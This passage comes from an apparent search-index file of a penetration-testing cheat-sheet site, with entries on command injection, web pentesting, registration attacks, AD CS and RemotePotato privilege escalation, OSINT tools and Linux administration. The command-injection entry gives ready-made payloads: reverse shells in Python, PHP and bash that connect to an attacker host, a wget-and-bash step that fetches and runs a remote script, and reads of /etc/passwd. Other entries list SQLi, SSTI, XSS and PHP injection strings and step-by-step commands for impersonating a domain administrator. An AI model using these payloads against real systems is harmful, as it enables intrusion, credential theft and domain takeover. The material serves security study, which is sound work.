                content: "Basic Payloads linkIf the payload includes whitespaces ( ), we need to change it to + or URL encoding (%20).\n/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | /?q=;system($_GET[cmd])\u0026cmd=whoami /?q=${system($_GET[cmd])}\u0026cmd=whoami /?productId=1\u0026stockId=1|whoami /?productId=1\u0026stockId=1|id /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt') ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.\n# %0A: newline /?cmd=ls%0Aid # %250A: newline (double encoding) /?cmd=ls%250Aid # %26: \u0026 /?cmd=ls%26id # %2526: \u0026 (double encoding) /?cmd=ls%2526id # \u0026\u0026 /?cmd=ls%26%26id /?cmd=ls%2526%2526id # %3B: ; /?cmd=ls%3Bid # %253B: ; (double encoding) /?cmd=ls%253Bid Bypass Whitespace Filter linkReference: https://www.ctfnote.com/web/os-command-injection/whitespace-bypass\nIf the website filters whitespaces and we cannot inject OS command including spaces e.g. sleep 5, we can insert Internal Field Separator (IFS) as whitespace.\n$IFS$9 Payload Examples: link /?cmd=ping$IFS$9-c$IFS$9510.0.0.1 Ping linkTry pinging to our local machine for checking if our command injection achieves.\nTo confirm the result, start tcpdump in our local machine.\n# -i: Interface e.g. eth0, tun0 sudo tcpdump -i eth0 icmp Then execute ping command in POST request.\nBelow are examples for POST data.\nfile=example.jpg\u0026filetype=png;ping+-c+1+10.0.0.1 Reverse Shell link file=example.jpg\u0026filetype=png;export RHOST=\"10.0.0.1\";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' PHP Reverse Shell linkReference: https://book.hacktricks.xyz/pentesting-web/command-injection#examples\n# 1. Download PHP payload wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php # 2. Edit `ip` and `port` values. vim shell.php # 3. Send payload \u0026 get shell (run `nc -lvnp ` in another terminal before doing this) /?cmd=ls%0Awget+http://10.0.0.1/shell.php+-O+/tmp/shell.php%0Aphp+/tmp/shell.php Blind Command Injection (Time Delay) linkUse ping command to check if the website will be loaded with time delay.\nname=michael\u0026email=michael@example.com||ping+-c+10+127.0.0.1||\u0026message=hello email=test@test.com;ping+-c+15+127.0.0.1+#\u0026message=hello If we find the command can be executed, we can execute the other commands as below.\nemail=test@test.com;cp+/etc/passwd+./+#\u0026message=hello JSON Injection link { \"username\": \"\\\"; pwd \\\"\" } {\"email\": \"\\\";ping -c 1 10.0.0.1\\\"\"} {\"name\":\"\", \"email\":\"victim@vulnerable.com\"} {\"name\": \"admin\", \"content\": \"{{template: ./admin.php}}\"} PHP Injection link id=$(php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");') # URL encode id=1$(php%20-r%20'$sock=fsockopen(%2210.0.0.1%22,4444);exec(%22/bin/sh%20-i%20%3C\u00263%20%3E\u00263%202%3E\u00263%22);') id=1$(php%20-r%20%27%24sock%3Dfsockopen%28%2210.0.0.1%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27) id=1`php%20-r%20%27%24sock%3Dfsockopen%28%2210.0.0.1%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27` Indirect Payloads with Shell Script linkIf we cannot inject command directly as above, try injecting from files.\nCreate a shell script. The filename here is evil.sh`.\n#!/bin/bash bash -c 'bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261' Host this file by starting web server in the directory where the evil.sh exists.\nsudo python3 -m http.server 80 In target website, inject command to let target server download the shell script and execute it. Before that, we need to start listerner by nc -lvnp 4444 in another terminal in local machine. Here is the example.\n/?cmd=ls;wget+http://10.0.0.1/evil.sh|bash We might get a shell.\n"
            }
        );
    index.add(
            {
                id:  73 ,
                href: "\/docs\/hdks\/web\/method\/web-basic-pentesting\/",
                title: "Web Basic Pentesting",
                description: "Basic methodologies of web penetration tests. A default port is 80. HTTPS uses a port 443.",
                content: "Enumeration link # Nmap nmap --script http-auth --script-args http-auth.path=/login -p 80,443 nmap --script http-devframework -p 80,443 nmap --script http-enum -p 80,443 nmap --script http-headers -p 80,443 nmap --script http-methods -p 80,443 # WHOIS whois example.com # Nikto nikto -h http:// # -p: Specify ports nikto -p 80,3000 -h # -T: Tuning # 1: Interesting files # 2: Misconfiguration # 3: Information Disclosure # 4: Injection (XSS/Script/HTML) nikto -T 1 2 3 -h # -useragent: Custom user agent nikto -useragent -h # -e: IDS evasion # 1: Random URI encoding # 7: Change the case of URL nikto -e 1 7 -h # Whatweb whatweb # Aggression level (1-4) whatweb -a 3 # List all plugins whatweb -l # Search plugins whatweb -I apache whatweb -I phpBB whatweb -I phpmyadmin whatweb -I windows # Use plugin whatweb -p phpBB SSL Certificate linkIt may contain the sensitive information about the target company.\nWe can find it on the key icon in the URL bar in the most web browsers.\n# Check SSL/TLS connection and get the certificate openssl s_client --connect example.com:443 sslscan example.com # Detect TLS version openssl s_client -connect example.com:443 -tls1 openssl s_client -connect example.com:443 -tls1_1 openssl s_client -connect example.com:443 -tls1_2 openssl s_client -connect example.com:443 -tls1_3 Check Certificate Content link Open web browser. Click on the lock icon at the left of URL bar. Download the PEM (.pem) file of the certificate . Get the content of the PEM file using openssl. openssl x509 -text -noout -in example.pem Bypass HTTPS Forbidden (403) linkIf we cannot access to target website with such error 403 Forbidden, we need to check the certificate.\nFor example, in FireFox, we can see the certificate by clicking on the lock icon at the left of the URL bar. Then check the Common Name e.g. example.abc.\nWe might be able to access to the domain host by adding the domain in /etc/hosts in our local machine as below.\n10.0.0.1 example.abc Now access to the website again. We might be able to see the contents of the website.\nFind Information in Web Pages link curl http://vulnerable.com/ | grep -i hidden curl http://vulnerable.com/ | grep -i password Find Source Code linkIf the target organization (or user) manages the source code in such like GitHub or GitLab, we might be able to find the source code.\nHere is GitHub Dorks examples. Try searching the repository with the site name or project name in GitHub.\nlanguage:Python language:PHP # e.g. ExampleBlog language:PHP Request using Python linkGET Request link #!/usr/bin/env python3 import requests ip = '10.0.0.1' port '80' url = 'http://%s:%s' % (ip, port) ua = 'Mozilla/5.0 ...' # Args params = {'page': '2', 'item': 'chair'} headers = {'User-Agent': ua} cookies = {'PHPSESSID': 'a953b5...'} auth = requests.auth.HTTPBasicAuth('username', 'password') r = requests.get(url, params=params, headers=headers, cookies=cookies, auth=auth) print(r.text) With Session\n#!/usr/bin/env python3 import requests url = 'http://example.com' session = requests.Session() r = session.get(url) print(r.text) POST Request link #!/usr/bin/env python3 import requests url = 'http://example.com/login' data = {'username': 'admin', 'password': 'admin'} # Args headers = {'User-Agent': ua} cookies = {'PHPSESSID': 'a953b5...'} r = requests.post(url, data=data, headers=headers, cookies=cookies) With Session\n#!/usr/bin/env python3 import requests url = 'http://example.com/comment' data = {'name': 'Mike', 'comment': 'Hello'} session = requests.Session() r = session.post(url, data=data) print(r.text) "
            }
        );
    index.add(
            {
                id:  74 ,
                href: "\/docs\/hdks\/web\/method\/web-registration-attack\/",
                title: "Web Registration Attack",
                description: "Registration mechanism might be vulnerable to compromise.",
                content: "Register with the Same Username/Email Address as Existing User linkWe might be able to register the same username/email address as the existing user. It may affect the web server so be careful when testing.\nHere are examples of username to register.\nadmin administrator root Alternatively, its worth to try various approach to register.\n# Insert null byte admin%00 # Insert a space before username admin %20admin # Insert a space after username admin admin%20 # Insert spaces around username admin %20admin%20 # Overflow (we need to find the longest characters that can be registered) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxadmin Malicious Usernames linkXSS linkWe might be able to inject XSS in username when registration.\njohn john john # Combine with overflow character length xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx SSTI linkIts worth to try SSTI payloads if the website uses frameworks/template engines such as Flask Pug, Angular, etc. Register username with the following SSTI.\n{{2*3}} {2*3} ${2*3} 2*3 {{ `` }} {% debug %} SQLi linkIf website queries the database items using username, we might be able to inject SQL command in the username. Register username with the following SQLi.\ntest' or 1=1-- test' or '1'='1'-- test' union select null,null-- test' union select null,null,null-- PHP Injection link john\u003c?php echo system('id');?\u003e john\u003c?php system('ping -c 1 10.0.0.1');?\u003e Broken Access Control linkWe might be able to break the access restrictions on target page by adding specific params when registration.\nusername=test\u0026password=test\u0026admin=true username=test\u0026password=test\u0026isAdmin=true username=test\u0026password=test\u0026admin=1 username=test\u0026password=test\u0026usertype=1 "
            }
        );
    index.add(
            {
                id:  75 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-adcs\/",
                title: "Windows PrivEsc with AD CS",
                description: "We may be able to compromise Active Directory with vulnerable AD CS configurations or templates.",
                content: "DISCLAIMER: I still dont really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.\nEnumerate Certificate Templates linkCertificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.\nTo enumerate them, we can use Certify or Certipy.\ncertipy find -u user@example.local -p password -dc-ip -stdout certipy find -vulnerable -u user@example.local -p password -dc-ip -stdout Certify.exe find /vulnerable ESC1 linkRequirements to Attack link Attribute Value Description msPKI-Certificate-Name-Flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001) If the flag is present, a requester can specify the SAN(Subject Alternative Name). msPKI-enrollment-flag None Authorized Signature Required 0 Its not required. pKIExtendedKeyUsage Client Authentication, PKINIT Client Authentication, Smart Card Login, Any Purpose, or no EKU (SubCA) Enrollment Permissions Low-level domain users such as Authenticated Users Low-priivileged users can request a certificate with the template. Manager approval Disabled Exploit linkReference: HackTricks\nRequest the certificate specifying the altname as a Domain Admin such as localadmin then impersonate an administrator.\nCertify.exe request /ca:dc.example.local\\VULN-CA /template:VulnTemplate /altname:localadmin certipy req 'example.local/username:password@ca.example.local' -ca 'VULN-CA' -template 'VulnTemplate' -upn 'administrator@example.local' Then transform .pem to .pfx using openssl.\n# Copy the content of the PEM then paste it to the cert.pem using editor. nano cert.pem # Convert PEM to PFX openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx After that we can request TGT using Rubeus.\nRubeus.exe asktgt /user:localadmin /certificate:cert.pfx /password:Password123! /ptt # if you gave the password for \"cert.pfx\", you need to specify the password Rubeus.exe asktgt /user:Administrator /password:password123 /certificate:cert.pfx /ptt # or output the file Rubeus.exe asktgt /user:Administrator /certificate: /outfile:ticket.kirbi certipy auth -pfx administrator.pfx -username administrator -domain example.local -dc-ip If you get the error like Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), sync the time with AD server.\nsudo rdate -n # or ntpdate Now we get the NT hash so we can login the target machine using this hash by Pass-The-Hash.\nOr if we outputs as .kirbi, crack it by john.\nCrack TGT Please see Kerberos TGT Cracking.\nPass-The-Ticket impacket-ticketConverter ticket.kirbi ticke.ccache ESC2 linkRequirements to Attack link Attribute Value Description msPKI-Certificate-Name-Flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001) If the flag is present, a requester can specify the SAN(Subject Alternative Name). msPKI-enrollment-flag None Authorized Signature Required 0 Its not required. pKIExtendedKeyUsage Any Purpose EKUs or no EKU (SubCA) Enrollment Permissions Low-level domain users such as Authenticated Users Low-priivileged users can request a certificate with the template. Manager approval Disabled Exploit linkThe following LDAP query when run against the AD Forests configuration schema can be used to enumerate templates matching this scenario.\n# 1.2.840.113556.1.4.804: LDAP_MATCHING_RULE_BIT_OR # 2.5.29.37.0: Any Purpose EKU (\u0026(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))) ESC3 linkTo abuse this for privilege escalation, a CAs requires at least two templates conditions.\nRequirements to Attack (Condition 1) link Attribute Value Description Authorized Signature Required 0 Its not required. pKIExtendedKeyUsage Certificate Request Agent EKU The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), known as Enrollment Agent, allows for requesting other certificate templates on behalf of other principals. Enrollment Permissions Low-level domain users such as Authenticated Users Low-priivileged users can request a certificate with the template. Enrollment Agent Restrictions Not implemented Manager approval Disabled Requirements to Attack (Condition 2) link Attribute Value Description Authorized Signature Required 1 Its required. Schema Version 1 or is greater than 2 Application Policies Certificate Request Agent EKU pKIExtendedKeyUsage Certificate Request Agent EKU Client Authentication Enrollment Permissions Low-level domain users such as Authenticated Users Low-priivileged users can request a certificate with the template. Enrollment Agent Restrictions Not implemented Manager approval Disabled Exploit linkWe can request an enrollment agent certificate (Condition 1).\nCertify.exe request /ca:dc.example.local\\VULN-CA /template:VulnTemplate certipy req 'example.local/username:password@ca.example.local -ca 'VULN-CA' -template VulnTemplate Then issue a certificate request on behalf of another to a template that allows for domain authentication (Condition 2).\nCertify.exe request /ca:dc.example.local\\VULN-CA /template:User /onbehalfof:example\\itadmin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:asdf certipy req 'example.local/username:password@ca.example.local' -ca 'VULN-CA' -template 'User' -on-behalf-of 'example\\administrator' -pfx 'cert.pfx' Ask TGT to authenticate as the On Behalf Of user.\nRubeus.exe asktgt /user:example\\itadmin /certificate:itadminFromEnrollmentAgent.pfx /password:asdf ESC4 linkRequirements to Attack link Attribute Value Description Access Control rights Users have Full Control or Write permission. Object Control Permissions Users have Owner, FullControl, WriteOwner, WriteDacl or WriteProperty permission. ESC6 linkRequirements to Attack link Attribute Value Description EDITF_ATTRIBUTESUBJECTALTNAME2 flag Enabled If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the SAN (subject alternative name.) Exploit linkFirst off, check if the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set on the CA.\ncertutil getreg policy\\EditFlags reg query \\\\\\HKEY_LOCAL_MACHINE_SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\ /v EditFlags If set, abuse it by using /altname flag with any template (e.g. User) that allows for domain auth.\nCertify.exe request /ca:dc.example.local\\VULN-CA /template:User /altname:localadmin certutil -config \"VULN-CA-HOST\\VULN-CA\" -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 linkRequirements to Attack link Attribute Value Description CA Permissions Low-privileged users have ManageCA (aka CA Administrator) permissions or ManageCertificates (aka Certificate Manager/Officer). The ManageCA permission grants a principal the ability to perform Administrative CA actions, including the modification of persistent configuration data. This includes the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. Exploit linkAt first we need to know the CA Name so run the following command then check the output.\ncertipy find -u username@example.local -p password -dc-ip -stdout # Also it can be used. Get-CertificationAuthority -ComputerName dc.example.local | Get-CertificationAuthorityAcl | select -expand Access Then add new officer to the CA. Replace victim-ca with actual name found.\n# -add-officer: Add a new officer to specific CA (specified with `-ca`) # -ca: Specify the CA Name certipy ca -u username@example.local -p password -dc-ip -ca 'victim-ca' -add-officer username Next, enable the template on the CA.\ncertipy ca -u username@example.local -p password -dc-ip -ca 'victim-ca' -enable-template 'SubCA' # Check if the template enabled successfully certipy ca -u username@example.local -p password -dc-ip -ca 'victim-ca' -list-template Request the certificate for the template such as SubCA.\n# -upn: Alternative UPN certipy req -u username@example.local -p password -dc-ip -ca 'victim-ca' -template 'SubCA' -upn administrator@example.local -target example.local If failed, we can issue the request with the request ID.\ncertipy ca -u username@example.local -p password -dc-ip -ca 'victim-ca' -issue-request certipy req -u username@example.local -p password -dc-ip -ca 'victim-ca' -target example.local -retrieve Now we have administrator.pfx. Using this, we can retrieve the hash.\ncertipy ca auth -pfx administrator.pfx -dc-ip -domain example.local -username administrator Crack the hash and get the administrators password or execute pass-the-hash attack.\nESC8 linkAD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. These HTTP-based certificate enrollement interfaces are all vulnerable NTLM relay attacks.\nExploit linkEnumerate enabled HTTP AD CS endpoints with Certify.\nCertify.exe cas To parse and list the CES endpoints in their AD object in the msPKI-Enrollment-Servers, execute the following command.\ncertutil -enrollmentServerURL -config DC.EXAMPLE.LOCAL\\VULN-CA Import-Module PSPKI Get-CertificationAuthority | Select Name,Enroll* | Format-List * Privilege Escalation with Microsoft Management Console (MMC) linkIf we find the template which contains vulnerable parameters, we can create a new certificate using the template and can gain access to the Administrators account.\nThere are some method to create the new one. However, this section provides the easiest way using MMC.\n1. Request a New Malicious Certificate with MMC link Right-click on the Windows icon, and select Run.\nEnter mmc (Microsoft Management Console)* in the form and click OK. The console window opens.\nIn the MMC window, click File  Add/Remote Snap-in..\nAdd the Certificates snap-in in the window then click OK.\nExpand the Certificates in the left pane.\nRight-click on the Personal and select All Tasks  Request New Certificate.\nThe Certificate Enrollment window, click Next twice.\nIn Request Certificates section, click the More information is required to enroll.\nIn Certificate Properties window, choose types and enter values in the form.\nSubject name:\nType: Common name Value: vulncert (specify an arbitrary name) Alternative name:\nType: User principal name Value: tester@abc.example.com (specify the impersonated name and the target domain) Add each name and click OK.\nReturn to the Request Certificates section. Check on the certificate we want to request, then click Enroll.\nAfter finishing, expand Personal  Certificates. We should see the new certificate is added.\nDouble-click on the certificate. The Certificate window opens.\nIn the Certificate window, select Details tab and choose Subject Alternative Name. We should see the principal name is our specified name e.g. tester@abc.example.com. If we can, click OK to close the window.\nAt the end, in the MMC window, right-click on the new certificate which we created and select All Tasks  Export to export the certificate. The Certificate Export Wizard opens.\nIn Export Private Key section, select Yes, export the private key and click Next.\nIn Export File Format, it is usually okey the default .PFX format so click Next without any changes.\nIn Security section, check the Password and enter new password.\nIn File to Export section, enter the file name and Next.\nFinally click Finish then we could export the new malicious certificate.\n2. Impersonate User using the Malicious Certificate linkIf we create a new certificate, we can use it to impersonate the privileged user.\nRequest Kerberos TGT (Ticket Granting Ticket).\nRubeus.exe is useful to do for that. For details, see Privilege Escalation with Kerberos.\nRubeus.exe asktgt /user:tester /enctype:aes256 /certificate:vulncert.pfx /password:password /outfile:tester.kirbi /domain:labc.example.com /dc: After that, we should get the TGT (.kirbi file).\nWe can gain access using the TGT by changing the password of the DA account.\nChange the Password of the DA (Domain Administrator) Account.\n# changepw: Change the password of the target user # /ticket: Specify the TGT file (.kirbi) we've generated # /new: New password for impersonated user # /targetuser: Specify the Domain Administrator account name Rubeus.exe changepw /ticket:tester.kirbi /new:newpass /dc: /targetuser:abc.example.com\\ Get the Administrators Shell\nUsing runas command, we can gain access to the Administrators account.\nUse the new password which weve given the previous section in prompt.\nrunas /user:abc.example.com\\ cmd.exe Add Computer and PrivEsc link1. Add Computer to the Domain linkWe can use the addcomputer (impacket) which is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.\nimpacket-addcomputer 'example.local/username:password' -method LDAPS -computer-name 'TEST$' -computer-pass 'password' # or impacket-addcomputer 'example.local/username:password' -dc-ip 10.0.0.1 -method LDAPS -computer-name 'TEST$' -computer-pass 'password' # or impacket-addcomputer 'example.local/username:password@example.com' -method LDAPS -computer-name 'TEST$' -computer-pass 'password' 3. Request Certificates linkAfter adding new computer, we might be able to retrieve certificate using this computer account.\nAt this time, try using alternate UPN (-upn) for administrator because we want to escalate privilege.\ncertipy req -u 'TEST$' -p 'password' -ca VULN-CA -target example.local -dc-ip 10.0.0.1 -dns ca.example.local -template Example -upn Administrator@example.local If successful, the file which contains certificates and private key (e.g. administrator.pfx) will be saved in current directory.\n4. Authenticate using PFX linkWe might be able to retrieve TGT using the .pfx file as below.\n# From outside of target machine certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 # From inside of target machine Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt Then using/cracking it to authenticate as Administrator.\nOption: Authenticate over LDAP linkReference: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html\nAccording to the article above, we may be able to authenticate over some protocols such as LDAP(S). First off, split the administrator.pfx with certificate and private key using two commands below.\n# Extract certificate by `-nokey` flag certipy cert -pfx administrator.pfx -nokey -out cert.crt # Extract private key by `-nocert` flag certipy cert -pfx administrator.pfx -nocert -out cert.key After that, using PassTheCert, we can spawn shell as Administrator via Schannel against LDAP(S).\npython3 passthecert.py -dc-ip 10.0.0.1 -crt cert.crt -key cert.key -domain example.local -port 636 -action ldap-shell "
            }
        );
    index.add(
            {
                id:  76 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-remotepotato\/",
                title: "Windows PrivEsc with RemotePotato",
                description: "Exploit linkReference: RemotePotato0 According to the RemotePotato0s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). We can download the executable from https://github.com/antonioCoco/RemotePotato0. Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp::9999 \u0026 sudo ntlmrelayx.",
                content: "Exploit linkReference: RemotePotato0\nAccording to the RemotePotato0s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).\nWe can download the executable from https://github.com/antonioCoco/RemotePotato0.\nModule 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp::9999 \u0026 sudo ntlmrelayx.py -t ldap:// --no-wcf-server --escalate-user normal_user # In target machine # -m 0: Module (Rpc2Http cross protocol relay server + potato trigger) # -r: Remote HTTP relay server # -x: Rogue Oxid resolver ip # -p: Rogue Oxid resolver port # -s: Session id for the Cross Session Activation Attack .\\RemotePotato0.exe -m 0 -r -x -p 9999 -s 1 Module 1 (-m 1: Rpc2Http cross protocol relay server) link # -l: RPC Relay server listening port .\\RemotePotato0.exe -m 1 -l 9997 -r rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm Module 2 (-m 2: Rpc capture server + potato trigger) link query user .\\RemotePotato0.exe -m 2 -x -p 9999 -s 1 Module 3 (-m 3: Rpc capture server) link .\\RemotePotato0.exe -m 3 -l 9997 rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm "
            }
        );
    index.add(
            {
                id:  77 ,
                href: "\/docs\/hdks\/reconnaissance\/osint\/",
                title: "OSINT (Open Source Intelligence)",
                description: "Open-soruce intelligence is the collection and analysis of data gathered from open sources to produce actionable intelligence.",
                content: "Automation linkOSINT is a powerful method for investigating target organizations, websites, etc. However, its the tedious task to surfin the internet for finding desired information one by one. For that reason, its also recommended to use automation tools.\n*It might overlap a bit with recon automation tools\nBBOT\nA powerful subdomain scanner and port mapper.\nBlackbird\nSearches accounts by username in social networks.\nMaltego\nA comprehensive tool for information gathering.\nPhoneInfoga\nAn information gathering framework for phone numbers.\nComprehensive Tools link DeHashed\nWe can search anything assets but it requires subscription for seeing detailed information.\nFOFA\nA search engine for the global cyberspace.\nBelow are search query examples.\n# Domain domain=\"example.com\" # IP range ip=\"220.181.111.1/24\" HudsonRock Free Tools\nWe can search for compromised corporate, employee, or users.\nMetaDefender Cloud\nAn advanced threat detection and prevention platform.\nNmmapper\nWe can use it for WAF detection, subdomain finder, ping, IP lookup, IP geo location, etc.\nShodan\nA search engine that lets users search for various types of servers connected to the internet using a variety of filters.\nSpiderfoot\nSpiderFoot automates OSINT for threat intelligence and mapping your attack surface.\npython3 sf.py -l 127.0.0.1:5001 Then access to http://127.0.0.1:5001 in browser.\nThreat Intelligence Platform\nFind detailed information about a host and its underlying infrastructure in seconds through the Threat Intelligence Platform web interface.\nViewDNS.info\nIt provides Reverse IP Lookup, finds WHOIS records, so on. Checks other domains on the same IP.\nWebsites link Cisco Talos\nOne of the largest commercial threat intelligence teams in the world.\nNerdyData\nGet a list of websites that use certain source (HTML/Javascript source code e.g. Googla Analytics code).\nSecurity Headers\nScan websites.\nurlscan.io\nURL and website scanner.\nURLhaus\nA project from abuse.ch with the goal of sharing malicious URLs that are being used for malware distribution.\nWappalyzer\nIt identifies technologies on websites.\nWayback Machine\nIt provides archived web pages.\nResearch Old Information\nrobots.txt, sitemap.xml, and other interesting files.\nDirectories\nURL parameters\nAPI keys\nUseful Tools\nWaybackurls\nFetch all URLs that the Wayback Machine knows about for a domain.\nDomains link Whoxy\nA domain search engine.\nWhoisXML\nIP Address link AbuseIPDB\nA project dedicated to helping combat the spread of hackers, spammers, and abusive activity on the internet.\nCensys Search\nIt provides information of specific IP addresses and domains.\nCloudflare Radar\nUp to date Internet trends and insight.\nipinfo.io\nMAC Address link MAC Address Lookup\nIt provides you information about any MAC Address of a networking card installed into your computer or any other device.\nMalware link MalShare\nA community driven public malware repository that works to provide free access to malware samples and tooling to the infomation.\nMalwareBazaar\nA project from abuse.ch with the goal of sharing malware samples with the infosec community, AV vendors and threat intelligence providers.\nIndicators of Compromise (IOCs) link ThreatFox\nA platform from abuse.ch with the goal of sharing indicators of compromise (IOCs) associated with malware with the infosec community, AV vendors and threat intelligence providers.\nBotnet link Feodo Tracker\nA project of abuse.ch with the goal of sharing botnet C\u0026C servers associated with Dridex, Emotet (aka Heodo), TrickBot, QakBot (aka QuakBot / Qbot) and BazarLoader (aka BazarBackdoor).\nSSL link Qualys\nThis free online service performs a deep analysis of the configuration of any SSL web server on the public Internet.\nSSLBL\nA project of abuse.ch with the goal of detecting malicious SSL connections, by identifying and blacklisting SSL certificates used by botnet C\u0026C servers. In addition, SSLBL identifies JA3 fingerprints that helps you to detect \u0026 block malware botnet C\u0026C communication on the TCP layer.\nEmail Address link Have I Been Pwned\nWe can check if the email address is breached.\nHunter\nThreat Intelligence link MITRE ATT\u0026CK threatfeeds.io DigitalSide CVE link Exploit DB GitHub Advisory Database Hacktivity (HackerOne) Hacktivity (Huntr) Sploitus "
            }
        );
    index.add(
            {
                id:  78 ,
                href: "\/docs\/hdks\/linux\/management\/shell-scripting\/",
                title: "Shell Scripting",
                description: "For Loop link #!/bin/bash for i in {1..5} do echo \"Hello $i\" done 4 Digits Loop link #!/bin/bash for i in {0000..9999} do echo $i done Read Text Line by Line linkread-text.sh #!/bin/bash while read line do echo $line done \u003c example.txt Retrieve Arguments linkGetopts is useful. Create my_opt.sh. #!/bin/bash getopts c cmd echo $cmd Run. This output is the current username. ./my_opt.sh -cwhoami While Loop and Retrieving Arguments Create my_while_opt.",
                content: "For Loop link #!/bin/bash for i in {1..5} do echo \"Hello $i\" done 4 Digits Loop link #!/bin/bash for i in {0000..9999} do echo $i done Read Text Line by Line linkread-text.sh\n#!/bin/bash while read line do echo $line done \u003c example.txt Retrieve Arguments linkGetopts is useful.\nCreate my_opt.sh.\n#!/bin/bash getopts c cmd echo $cmd Run. This output is the current username.\n./my_opt.sh -cwhoami While Loop and Retrieving Arguments\nCreate my_while_opt.sh. ```sh while getopts ab: flag do case \"${flag}\" in a) command1=${OPTARG};; b) command2=${OPTARG};; esac done cmd1=$($command1) echo $cmd1 cmd2=$($command2) echo $cmd2 Run. This output is the current username and current time.\n./my_while_opt.sh -awhoami -btime # kali # real 1111.11s ... "
            }
        );
    index.add(
            {
                id:  79 ,
                href: "\/docs\/hdks\/linux\/management\/add-and-delete-groups-in-linux\/",
                title: "Add \u0026 Delete Groups in Linux",
                description: "We can easily add/delete groups in Linux using `groupadd`, `groupdel` commands.",
                content: "Add/Delete Groups link # Add a group groupadd # Delete a group groupdel Add User to Group link # -a: Append the user to the specific group # -G: Group usermod -a -G # Change user's primary group # -g: GID usermod -g Sudo Group linkUssers who belong to sudo group can execute commands with sudo. To add a user to the sudo group, run the following command.\nusermod -a -G sudo After that, we can check the result.\n# Switch to target user su # List the user's privileges. sudo -l List Groups linkWe can see groups exist in Linux using the following commands.\ncat /etc/group groups # List groups where the specific user in groups "
            }
        );
    index.add(
            {
                id:  80 ,
                href: "\/docs\/hdks\/linux\/management\/add-and-delete-user-in-linux\/",
                title: "Add \u0026 Delete Users in Linux",
                description: "We can easily add/delete users in Linux using `useradd`, `userdel` commands.",
                content: "Add Users linkWe can use useradd or adduser command to add users in Linux.\nuseradd adduser # -p: Specify password useradd -p # -u: Specify UID # -g: Specify GID useradd -u 1000 -g 1000 Set Password for User link # Set passwords. It's stored in \"/etc/shadow\" passwd Delete Users linkWe can use userdel or deluser command to delete users in Linux.\nuserdel deluser # -r: Remove home directory and mail spool userdel -r List Users in Linux linkTo list users exist in Linux, run the following commands.\ncat /etc/passwd cat /etc/shadow Allow Users to Run Commands as Root Privilege linkAdd users to the sudo group.\nusermod -a -G sudo # Check the permissions su sudo -l "
            }
        );
    index.add(
            {
                id:  81 ,
                href: "\/docs\/hdks\/linux\/management\/file-and-directory-ownership-in-linux\/",
                title: "File \u0026 Directory Ownership in Linux",
                description: "We can easily change ownership of file/directory using `chown` command.",
                content: "Change Ownership to Specific User link chown chown # -R: Recursive chown -R Examples link chown tester example.txt chown tester ./example chown -R tester ./example Change Ownership to Specific Group link chown : chown : # -R: Recursive chown -R : Examples link chown :testers example.txt chown :testers ./example chown -R :testers ./example Change Ownership to Specific User\u0026Group linkWe can give ownership of file/directory to specific both use and group at the same time.\nchown : chown : # -R: Recursive chown -R : Examples link chown tester:testers example.txt chown tester:testers ./example chown -R tester:testers ./example "
            }
        );
    index.add(
            {
